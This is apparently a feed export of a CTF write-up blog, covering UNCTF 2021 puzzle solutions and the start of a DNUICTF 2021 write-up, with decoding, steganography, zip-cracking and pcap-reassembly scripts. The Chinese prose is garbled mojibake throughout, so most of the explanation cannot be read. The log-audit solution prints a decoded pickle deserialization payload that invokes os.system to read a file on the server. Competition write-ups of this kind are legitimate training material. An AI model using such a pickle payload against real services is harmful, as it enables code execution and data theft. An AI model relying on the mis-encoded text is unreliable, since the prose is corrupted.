æ‰“é’±ç»™æœ•ï¼Œæœ•æ˜å¤©ç›´æ¥å¸¦éƒ¨é˜Ÿå¤æ´»ï¼Œè®©ä½ ç»Ÿé¢†ä¸‰å†›!å»ºç«‹åƒå¤ç½—é©¬ä¸€æ ·çš„å¸å›½ï¼Œå›æ— æˆè¨€ï¼ æœ•çš„è´¦æˆ·æ˜¯<code>5.#4&amp;;Sw)2Ti%*Sj1eUU9kTwi*Sj)1S&quot;a8S0)6x-8(x7=</code></p><p>flagæ ¼å¼ä¸ºunctf{}</p></blockquote><p>å°è¯•å¼‚æˆ–çˆ†ç ´ï¼Œå‘ç°å¼‚æˆ–0x40æœ‰ <code>unctf&#123;.7ir.)ej.*q%..y+.7)j.*iq.b!x.piv8mxh8w&#125;</code>ï¼Œè¯´æ˜ä¸­é—´åŠ å¯†æ–¹å¼ä¸åŒã€‚</p><p>æå–ä¸­é—´éƒ¨åˆ†å°è¯•å‡ºæ˜¯ROT47+å‡¯æ’’17ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&#x27;$HXa%:TY$;`6&amp;&amp;h&lt;%H:Y$;X`$Q2g$_XeI\gWIf&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">200</span>,<span class="number">200</span>):</span><br><span class="line">    t=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(s[j])+i &gt;=<span class="number">32</span> <span class="keyword">and</span> <span class="built_in">ord</span>(s[j])+i&lt;<span class="number">127</span>:</span><br><span class="line">            t+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(s[j])+i)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(t)==<span class="built_in">len</span>(s):</span><br><span class="line">        <span class="built_in">print</span>(i,t)</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <code>5Yir6Kej5LqG77yM6YKj5Liq5bCx5pivZmxhZw</code> base64è§£ç æ˜¯ <code>åˆ«è§£äº†ï¼Œé‚£ä¸ªå°±æ˜¯flag</code>ã€‚</p><p>flagï¼š<code>unctf&#123;5Yir6Kej5LqG77yM6YKj5Liq5bCx5pivZmxhZw&#125;</code></p><p>â€‹    </p><h2 id="Misc"><a href="#Misc" class="headerlink" title="# Misc"></a># Misc</h2><h3 id="ç®€å•æ—¥å¿—å®¡è®¡"><a href="#ç®€å•æ—¥å¿—å®¡è®¡" class="headerlink" title="ç®€å•æ—¥å¿—å®¡è®¡"></a>ç®€å•æ—¥å¿—å®¡è®¡</h3><blockquote><p>ç›¸ä¼ ï¼Œåœ¨æŸä¸€å½’éšé—¨æ´¾çš„æœåŠ¡å™¨é‡Œå­˜åœ¨ç€ä¼—å¤šç›–ä¸–ç»å­¦ï¼Œè°æŒæ¡äº†ä»»ä¸€ä¸€æœ¬ç»å­¦è°å°±èƒ½ä¸€ç»ŸCTFæ±Ÿæ¹–ï¼Œçªç„¶æœ‰ä¸€å¤©é—¨æ´¾çš„é•¿è€å‘ç°æœåŠ¡å™¨çš„æ—¥å¿—é‡Œå­˜åœ¨ç€äº›è®¸å¼‚å¸¸ï¼Œæˆ–è®¸è¿™é—¨ç»å­¦å·²ç»å¤±çªƒäº†ï¼Œè¯·å¸®å¸®é•¿è€æ‰¾å‡ºå¤±çªƒçš„æ˜¯å“ªä¸€æœ¬ç»å­¦å§ã€‚flagæ ¼å¼ä¸ºUNCTF{*}</p></blockquote><p>æ—¥å¿—æ–‡ä»¶é‡Œæ‰¾åˆ°base64ç¼–ç å­—ç¬¦ä¸² <code>STAKcDAKMFMnY2F0IC9DVEY/WW91U2hvdUppdVhpbmcnCnAxCjAoZzAKbHAyCjAoSTAKdHAzCjAoZzMKSTAKZHA0CjBjb3MKc3lzdGVtCnA1CjBnNQooZzEKdFIu</code>ï¼Œ</p><p>è§£ç å¾—pickleï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">I0</span><br><span class="line">p0</span><br><span class="line">0S&#x27;cat /CTF?YouShouJiuXing&#x27;</span><br><span class="line">p1</span><br><span class="line">0(g0</span><br><span class="line">lp2</span><br><span class="line">0(I0</span><br><span class="line">tp3</span><br><span class="line">0(g3</span><br><span class="line">I0</span><br><span class="line">dp4</span><br><span class="line">0cos</span><br><span class="line">system</span><br><span class="line">p5</span><br><span class="line">0g5</span><br><span class="line">(g1</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure><p>flagï¼š<code>UNCTF&#123;CTF?YouShouJiuXing&#125;</code></p><p>â€‹    </p><h3 id="ç”µä¿¡è¯ˆéª—"><a href="#ç”µä¿¡è¯ˆéª—" class="headerlink" title="ç”µä¿¡è¯ˆéª—"></a>ç”µä¿¡è¯ˆéª—</h3><blockquote><p>CTFer,ä½ å¥½ï¼Œæˆ‘æ˜¯å¨éœ‡å¤©ï¼å…¶å®æˆ‘åœ¨èŠåŠ å“¥å¤§æˆ˜ä¸­æ²¡æ­»ï¼Œç°åœ¨ä½ åªéœ€è¦æ‰“2000RMBåˆ°æˆ‘çš„é“¶è¡Œè´¦æˆ·ï¼Œæˆ‘å°±å¯ä»¥ç”¨è¿™2000RMBå‘çº¢åŒ…éª—å–äººä»¬çš„ä¿¡ä»»ï¼Œç„¶åç©¿è¿‡è‚¡å¸‚ç½‘ç»œæ‰¾åˆ°éœ‡è¡æ³¢åœ¨çº½çº¦ç»™æˆ‘æ‰¾çš„æ–°èº«ä½“ï¼Œç„¶åæˆ‘å°±å¯ä»¥å¤æ´»äº†ã€‚ä»Šå¤©å¦‚æœä½ å¸®äº†æˆ‘ï¼Œå¤æ´»åæˆ‘å¯ä»¥å…¥ä¾µè‚¡å¸‚ç½‘ç»œæŠŠé’±å…¨éƒ¨ç»™ä½ ä»¬ã€‚ç­‰è¿‡äº†å‘¨æœ«ï¼Œæˆ‘å°±è®©çº¢èœ˜è››å˜æˆé£æœºå»æ¥ä½ ï¼Œç„¶åæˆ‘æŠŠçº¢èœ˜è››æ€äº†ï¼Œè®©ä½ å½“éœ¸å¤©è™å‰¯æŒ‡æŒ¥å®˜ï¼Œç„¶åæˆ‘ä»¬ä»å—ææ´²å‘ˆæ‰©æ•£å¼å‘å‡ºéœ¸å¤©è™å†›é˜Ÿï¼Œä¸‡å†›é½å‘ï¼Œå é¢†åœ°çƒï¼Œæ€ä¹ˆæ ·ï¼Ÿä¸ºäº†é˜²æ­¢è¿™æ¡æ¶ˆæ¯è¢«æ“å¤©æŸ±æ‹¦æˆªã€‚æˆ‘å°†é“¶è¡Œå¡å·è¿›è¡Œäº†åŠ å¯†ï¼Œå¸Œæœ›ä½ èƒ½æˆåŠŸè§£å¯†ã€‚æˆ‘çš„é“¶è¡Œè´¦æˆ·æ˜¯ <code>qi]m^roVibdVbXUU`h</code> </p><p>flagæ ¼å¼ï¼šunctf{}</p></blockquote><p>å˜å¼‚å‡¯æ’’åŠ å¯†ï¼Œè„šæœ¬çˆ†ç ´ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&#x27;qi]m^roVibdVbXUU`h&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">200</span>,<span class="number">200</span>):</span><br><span class="line">    t=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(s[j])+i+j &gt;=<span class="number">32</span> <span class="keyword">and</span> <span class="built_in">ord</span>(s[j])+i+j&lt;<span class="number">127</span>:</span><br><span class="line">            t+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(s[j])+i+j)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(t)==<span class="built_in">len</span>(s):</span><br><span class="line">        <span class="built_in">print</span>(t)</span><br></pre></td></tr></table></figure><p>flagï¼š<code>unctf&#123;yauoreright&#125;</code></p><p>â€‹    </p><h3 id="å¼•å¤§æµå’¯ï¼Œhappy"><a href="#å¼•å¤§æµå’¯ï¼Œhappy" class="headerlink" title="å¼•å¤§æµå’¯ï¼Œhappy"></a>å¼•å¤§æµå’¯ï¼Œhappy</h3><blockquote><p>è™šæ©çš„å¤§é—¨åæ˜¯ä¸€å‰¯æ®‹ç¼ºçš„ç”»å·ã€‚</p></blockquote><p>ä¿®æ”¹jpgé«˜åº¦å‘ç°flagã€‚</p><p>flagï¼š<code>UNCTF&#123;BellalaBella&#125;</code></p><p>â€‹    </p><h3 id="å€’ç«‹æ´—å¤´"><a href="#å€’ç«‹æ´—å¤´" class="headerlink" title="å€’ç«‹æ´—å¤´"></a>å€’ç«‹æ´—å¤´</h3><p>è§‚å¯Ÿæ–‡ä»¶å­—ç¬¦ä¸²å¤´å°¾åˆ†åˆ«æ˜¯ <code>d9ff</code> å’Œ <code>ffd8</code>ï¼Œè„šæœ¬é€†åºå¤„ç†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;key.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;key.jpg&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(<span class="built_in">bytes</span>.fromhex(f)[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>æŠŠæ–‡ä»¶å¤´ <code>D8FF</code> ä¿®æ­£ä¸º <code>FFD8</code>ï¼Œå›¾ç‰‡æ²¡ä»€ä¹ˆå¼‚å¸¸ï¼Œåœ¨ä¸­é—´å‘ç°å­—ç¬¦ä¸²ï¼š</p><p><code>5L2b5pel77ya5LiK5L+x5pWF44CC6YGg5aSn5a+G6Zq45oCv6Zmk5aSa55qk5a2V6ICo54iN5qK15Zyw6Kuz6Jap5L6E56m257y96ICB6Kuz5LiN5oOz55qk6ICF5ruF572w6Ly457y96Zi/5L6E5ruF5qK15aSi5L6E5LiN5Yal5ZCJ55yf5qK15rKZ57y95bqm5Y2z57y96Zq45oCv5piO5L6E5YiH5L6E55+l5ZGQ5Zyw5Y2X5ZG86IiN5ZKS5aWi5L2b5raF5ZOG5aeq56We5a+G5piO5ZOG6YCd5a6k5Zyw5oGQ5Yal5ZG85oCv5L2b5Zad5ZOG5Ly96YO95oCv6YGu6Kuz5YCS57y95bid5Yal5bid6Ly45puw6Kuz6bq85L+x5oCW5L+x6Ium5L+x5rOiCg==</code></p><p>è§£ç ï¼š</p><p><code>ä½›æ—¥ï¼šä¸Šä¿±æ•…ã€‚é å¤§å¯†éš¸æ€¯é™¤å¤šçš¤å­•è€¨çˆæ¢µåœ°è«³è–©ä¾„ç©¶ç¼½è€è«³ä¸æƒ³çš¤è€…æ»…ç½°è¼¸ç¼½é˜¿ä¾„æ»…æ¢µå¤¢ä¾„ä¸å†¥å‰çœŸæ¢µæ²™ç¼½åº¦å³ç¼½éš¸æ€¯æ˜ä¾„åˆ‡ä¾„çŸ¥å‘åœ°å—å‘¼èˆå’’å¥¢ä½›æ¶…å“†å§ªç¥å¯†æ˜å“†é€å®¤åœ°æå†¥å‘¼æ€¯ä½›å–å“†ä¼½éƒ½æ€¯é®è«³å€’ç¼½å¸å†¥å¸è¼¸æ›°è«³éº¼ä¿±æ€–ä¿±è‹¦ä¿±æ³¢</code></p><p>æŠŠ <code>æ—¥</code> æ”¹ä¸º <code>æ›°</code>ï¼Œä½›æ›°è§£å¯†å¾—flagã€‚</p><p>flagï¼š<code>unctf&#123;it_is_easy_right?&#125;</code></p><p>â€‹    </p><h3 id="LPL"><a href="#LPL" class="headerlink" title="LPL"></a>LPL</h3><p>pngå›¾ç‰‡ç”¨010 editoræŸ¥çœ‹ï¼Œç¬¬9-15ä¸ªå—CRCå€¼é”™è¯¯ï¼Œæå–Hexå€¼ <code>4544476e622121</code>ï¼Œè§£Hexå¾— <code>EDGnb!!</code>ã€‚</p><p>ä»¥æ­¤ä¸ºå¯†ç è§£å‹ç¼©åŒ…ï¼Œflag.txt æç¤º <code>https://www.bilibili.com/bangumi/play/ep431768?from=search&amp;seid=2681339926644936228&amp;spm_id_from=333.337.0.0</code>ï¼Œä»¥åŠä¸€ä¸ª <code>2021/11/24 14:11</code> çš„æ—¶é—´ï¼Œè®¿é—®Bç«™è§†é¢‘åœ¨è¯„è®ºåŒºæ‰¾åˆ° <code>2021/11/24 14:11</code> çš„è¯„è®ºè§flagã€‚</p><p>flagï¼š<code>flag&#123;LpL_zgbr_rNg_eDg777&#125;</code></p><p>â€‹    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;p&gt;ä¸ºå“åº”å›½å®¶é€‰æ‹”ã€æ¨èä¼˜ç§€ç½‘ç»œç©ºé—´å®‰å…¨ä¸“ä¸šäººæ‰ï¼ŒåŸ¹å…»å­¦ç”Ÿçš„åˆ›æ–°æ„è¯†ä¸å›¢é˜Ÿåˆä½œç²¾ç¥ï¼Œæé«˜å¤§å­¦ç”Ÿçš„ç½‘ç»œå®‰å…¨æŠ€æœ¯æ°´å¹³ã€åˆ›æ–°å®è·µä¸ç»¼åˆè®¾è®¡èƒ½åŠ›ï¼Œæ¨åŠ¨æˆ‘å›½é«˜æ ¡ç½‘ç»œç©ºé—´å®‰å…¨ä¸“ä¸šå»ºè®¾ä¸æ”¹é©ï¼Œå…¨å›½9æ‰€é«˜æ ¡ï¼ˆé—½å—å¸ˆèŒƒå¤§å­¦ï¼Œç¦å·å¤§å­¦è‡³è¯šå­¦é™¢ï¼Œé‡åº†å¤§å­¦ï¼Œé™†å†›å·¥ç¨‹å¤§å­¦ï¼Œå—äº¬</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021èµ›" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>ç¬¬ä¸€å±Šä¸œè½¯æ¯ç½‘ç»œCTFç«èµ›-DNUICTF</title>
    <link href="https://lazzzaro.github.io/2021/12/05/match-%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%B8%9C%E8%BD%AF%E6%9D%AF%E7%BD%91%E7%BB%9CCTF%E7%AB%9E%E8%B5%9BDNUICTF/"/>
    <id>https://lazzzaro.github.io/2021/12/05/match-%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%B8%9C%E8%BD%AF%E6%9D%AF%E7%BD%91%E7%BB%9CCTF%E7%AB%9E%E8%B5%9BDNUICTF/</id>
    <published>2021-12-05T12:40:24.000Z</published>
    <updated>2021-12-05T17:56:56.779Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    </p><p>ç”±å¤§è¿å¸‚å…¬å®‰å±€ä½œä¸ºæŒ‡å¯¼å•ä½ï¼Œå¤§è¿ä¸œè½¯ä¿¡æ¯å­¦é™¢ä¸»åŠï¼Œç½‘ç»œå®‰å…¨å·¥ä½œå®¤æ‰¿åŠï¼Œå¤§è¿ä¸œè½¯ä¿¡æ¯å­¦é™¢ç½‘ç»œä¸ä¿¡æ¯ä¸­å¿ƒã€è®¡ç®—æœºå­¦é™¢ã€è½¯ä»¶å­¦é™¢ï¼Œå“ç‰Œå‘å±•éƒ¨ã€å¾®å…‰ç½‘ç»œå·¥ä½œå®¤ååŠï¼Œå“ç‰Œå‘å±•éƒ¨ä¸å¾®å…‰ç½‘ç»œå·¥ä½œå®¤æä¾›è®¾è®¡æ”¯æŒï¼Œå¤§è¿æš—æ³‰ä¿¡æ¯æŠ€æœ¯æœ‰é™å…¬å¸èµåŠ©æ”¯æŒçš„â€œæš—æ³‰æ¯â€ç½‘ç»œå®‰å…¨ç«èµ›å°†äº2021å¹´12æœˆä»½ä¸¾è¡Œã€‚è¯¥ç«èµ›æ˜¯è¿ç”¨ä¿¡æ¯å®‰å…¨çŸ¥è¯†çš„ä¸€æ¬¡åˆ›æ–°æ€§ç«èµ›æ´»åŠ¨ï¼Œå¸Œæœ›é€šè¿‡è¿™æ¬¡æ¯”èµ›å¢å¼ºæˆ‘æ ¡å­¦ç”Ÿçš„å®‰å…¨çŸ¥è¯†è¿ç”¨èƒ½åŠ›å’Œç»éªŒç§¯ç´¯ã€‚æœ¬æ¬¡æ¯”èµ›ä¹Ÿé¢å‘æ ¡å¤–å¼€æ”¾æ³¨å†Œé€šé“ï¼Œæ—¨åœ¨ä¸ºä¿¡æ¯å®‰å…¨é¢†åŸŸçˆ±å¥½è€…æä¾›ä¸€ä¸ªäº¤æµå’Œæ°´å¹³å±•ç¤ºçš„èˆå°ã€‚</p><p>æœ¬æ¬¡ç«èµ›é‡‡ç”¨çº¿ä¸ŠCTFï¼ˆCapture The Flagï¼Œå¤ºæ——èµ›ï¼‰èµ›åˆ¶ã€‚é€‰æ‰‹å……åˆ†è¿ç”¨è‡ªèº«æŒæ¡çš„å„æ–¹é¢çš„çŸ¥è¯†ä¸æŠ€èƒ½ï¼Œè®¾æ³•è§£å¼€é¢˜ç›®ï¼Œè·å¾—é¢˜ç›®ä¸­çš„â€œFlagâ€å¹¶æäº¤ï¼Œå¾—åˆ°åˆ†æ•°ï¼Œæœ€ç»ˆæ ¹æ®åˆ†æ•°æ’åã€‚å†…å®¹æ¶‰åŠReverse(é€†å‘åˆ†æ)ï¼ŒWeb(Webæ¼æ´åˆ©ç”¨)ï¼ŒPWNï¼ˆæº¢å‡ºç±»ï¼‰ï¼ŒCrypto(å¯†ç å­¦)ï¼ŒMisc(æ··åˆæ‚é¡¹é¢˜)ç­‰æ–¹é¢ã€‚</p><p>ç«èµ›æ—¶é—´</p><p>2021å¹´12æœˆ4æ—¥ 10ï¼š00â€”2021å¹´12æœˆ5æ—¥22ï¼š00ï¼ˆ36ä¸ªå°æ—¶ï¼‰</p><p>æŠ¥åå¹³å°é“¾æ¥ï¼š<a href="http://ctf.neusoft.edu.cn/">http://ctf.neusoft.edu.cn/</a></p><p><strong>Rank: 9</strong></p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="ç­¾åˆ°-ç­¾åˆ°"><a href="#ç­¾åˆ°-ç­¾åˆ°" class="headerlink" title="[ç­¾åˆ°]ç­¾åˆ°"></a>[ç­¾åˆ°]ç­¾åˆ°</h3><blockquote><p>é™¤ç‰¹åˆ«è¯´æ˜å¤–æœ¬æ¬¡æ¯”èµ›flagçš„æ ¼å¼ç»Ÿä¸€ä¸º flag{å­—ç¬¦ä¸²}</p><p>æ¯”å¦‚ä¸‹é¢è¿™ä¸ªå°±æ˜¯ä¸€ä¸ªå…¸å‹çš„flag</p><p>flag{Dnui_ctf_2021_s1gn_in}</p><p>å°†ä¸Šé¢çš„flagæäº¤å³å¯å®Œæˆç­”é¢˜</p><p>å¦å¤–æœ¬æ¬¡CTFæ¯”èµ›ä¼šæ ¹æ®æ•´ä½“è§£é¢˜æƒ…å†µåˆ†æ‰¹æ¬¡æ”¾å‡ºé¢˜ç›® (è§£ä¸å‡ºé¢˜æ—¶ å¯ä»¥ç­‰å¾…ä¸‹ä¸€æ³¢æ–°é¢˜ç›®æ”¾å‡ºç»§ç»­ä½œç­”)</p><p>è¯·åŠ å…¥QQç¾¤ 630995618 æˆ–æŸ¥çœ‹å¹³å°å…¬å‘Š å…³æ³¨é¢˜ç›®åŠ¨æ€</p></blockquote><p><code>flag&#123;Dnui_ctf_2021_s1gn_in&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="èŒæ–°-åœ¨å“ªå‘¢"><a href="#èŒæ–°-åœ¨å“ªå‘¢" class="headerlink" title="[èŒæ–°]åœ¨å“ªå‘¢"></a>[èŒæ–°]åœ¨å“ªå‘¢</h3><blockquote><p>FLAGåœ¨å“ªå‘¢</p></blockquote><p>pdfå†…å®¹å…¨é€‰å¤åˆ¶ï¼Œæ‰“å¼€ä»»ä¸€æ–‡æœ¬ç¼–è¾‘å™¨ç²˜è´´ï¼Œå‘ç°flagï¼š<code>flag&#123;hey_there_is_no_thing&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="åªæ˜¯ä¸ªPNGï¼Œåˆ«æƒ³å¤ªå¤šäº†-png"><a href="#åªæ˜¯ä¸ªPNGï¼Œåˆ«æƒ³å¤ªå¤šäº†-png" class="headerlink" title="åªæ˜¯ä¸ªPNGï¼Œåˆ«æƒ³å¤ªå¤šäº†.png"></a>åªæ˜¯ä¸ªPNGï¼Œåˆ«æƒ³å¤ªå¤šäº†.png</h3><p>binwalkå‘½ä»¤æŸ¥çœ‹pngå›¾ç‰‡ï¼š<code>binwalk -e PNG.png</code>ï¼Œåˆ†è§£å‡ºæœ€åä¸€ä¸ªzlibå—ï¼Œå‘ç°flagï¼š<code>flag&#123;zhe_ti_mu_ye_tai_bt_le_XD&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="å‹ç¼©åŒ…å‹ç¼©åŒ…å‹ç¼©åŒ…å‹ç¼©åŒ…"><a href="#å‹ç¼©åŒ…å‹ç¼©åŒ…å‹ç¼©åŒ…å‹ç¼©åŒ…" class="headerlink" title="å‹ç¼©åŒ…å‹ç¼©åŒ…å‹ç¼©åŒ…å‹ç¼©åŒ…"></a>å‹ç¼©åŒ…å‹ç¼©åŒ…å‹ç¼©åŒ…å‹ç¼©åŒ…</h3><p>zipå‹ç¼©åŒ…å¥—å¨ƒï¼Œæ¯ä¸€å±‚çš„å¯†ç æ˜¯æ–‡ä»¶åï¼Œpythonè„šæœ¬è§£å¥—ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile </span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">now = <span class="string">&quot;yasuobao.zip&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;START &quot;</span>+now)</span><br><span class="line">zfile = zipfile.ZipFile(now)</span><br><span class="line">password = zfile.namelist()[<span class="number">0</span>].split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">zfile.extractall(members=zfile.namelist(), pwd=password.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">zfile.close()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">os.remove(now)</span><br><span class="line"><span class="keyword">except</span> OSError <span class="keyword">as</span> e:</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line">names = os.listdir()</span><br><span class="line"><span class="built_in">print</span>(names)</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> names:</span><br><span class="line"><span class="keyword">if</span> name.endswith(<span class="string">&#x27;.zip&#x27;</span>) <span class="keyword">and</span> name != now:</span><br><span class="line">now=name</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;END &#x27;</span>+now)</span><br></pre></td></tr></table></figure><p>æœ€åè§£å‹å¾—åˆ° <code>23333.zip</code>ï¼Œæ‰“å¼€å‘ç°æ³¨é‡Šæç¤ºå¯†ç 6ä½æ•°ï¼ŒARCHPRçˆ†ç ´å¾—756698ï¼Œè§£å‹å¾—flagï¼š<code>flag&#123;Unz1p_i5_So_C00l##&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="easysteg"><a href="#easysteg" class="headerlink" title="easysteg"></a>easysteg</h3><p>pngå›¾ç‰‡ï¼ŒäºŒç»´ç ç”¨å¾®ä¿¡æ‰«å‡ºå†…å®¹ <code>æŸç§å¸¸è§çš„éšå†™</code>ï¼Œç”¨010editor 16è¿›åˆ¶æŸ¥çœ‹ï¼Œå‘ç°å°¾éƒ¨æœ‰zipå‹ç¼©åŒ…ï¼Œæå–å‡ºæ¥ï¼Œè§£å‹å‡º <code>_find.png</code>ã€‚</p><p>å°è¯•é«˜ä½ä½éšå†™ã€ç›²æ°´å°ç­‰æ— ç»“æœï¼Œè€ƒè™‘stegpyï¼š</p><p><code>stegpy _find.png</code></p><p>å¾—åˆ°flagï¼š<code>flag&#123;Do_U_Kn0w_Ste9py??&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="range-download"><a href="#range-download" class="headerlink" title="range_download"></a>range_download</h3><blockquote><p>Hint: filter: dns</p></blockquote><p>Wiresharkæ‰“å¼€æµé‡åŒ…æ–‡ä»¶ï¼Œè§‚å¯Ÿåˆ°æœ‰å¾ˆå¤šè¿”å›1å­—èŠ‚çš„æµï¼Œä¸”è¯·æ±‚ä¸­éƒ½å¸¦ <code>xxx-xxx/2460</code> å­—ç¬¦ä¸²ï¼ŒçŒœæµ‹ä¸ºæ–‡ä»¶ <code>flag.7z</code> çš„å•å­—èŠ‚æ–­ç‚¹ä¸‹è½½ ï¼Œæ ¹æ®è¯·æ±‚ä¸å“åº”ç‰¹å¾ï¼Œç”¨è„šæœ¬æå–å‡ºæ‰€æœ‰1å­—èŠ‚ï¼Œå¹¶æŒ‰ç›¸åº”ä½ç½®å¡«å…¥æ•°ç»„ï¼Œä»¥å­—èŠ‚å½¢å¼å†™å…¥æ–‡ä»¶ã€‚å‘ç°ç¼ºå°‘ç¬¬2349ä½å­—èŠ‚ï¼ŒæŒ‰ç…§0x00-0xffåˆ†åˆ«å¡«å…¥ï¼Œç”Ÿæˆ256ä¸ª7zæ–‡ä»¶ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;range.pcapng&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">x1 = <span class="string">b&#x27;\x0d\x0aContent-Range: bytes &#x27;</span></span><br><span class="line">l1 = <span class="built_in">len</span>(x1)</span><br><span class="line">pos1 = [i.start() <span class="keyword">for</span> i <span class="keyword">in</span> re.finditer(x1, f)]</span><br><span class="line">x2 = <span class="string">b&#x27;\x0d\x0aContent-Type: application/x-7z-compressed\x0d\x0a\x0d\x0a&#x27;</span></span><br><span class="line">l2 = <span class="built_in">len</span>(x2)</span><br><span class="line">pos2 = [i.start() <span class="keyword">for</span> i <span class="keyword">in</span> re.finditer(x2, f)][<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">realpos = [<span class="built_in">int</span>(f[k+l1:k+l1+<span class="number">10</span>][:f[k+l1:k+l1+<span class="number">10</span>].index(<span class="string">b&#x27;-&#x27;</span>)]) <span class="keyword">for</span> k <span class="keyword">in</span> pos1]</span><br><span class="line">realval = [f[k+l2:k+l2+<span class="number">10</span>][<span class="number">0</span>] <span class="keyword">for</span> k <span class="keyword">in</span> pos2]</span><br><span class="line"></span><br><span class="line">out = [-<span class="number">1</span>]*<span class="number">2460</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(pos1)):</span><br><span class="line">out[realpos[i]]=realval[i]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(out.index(-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(out[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span 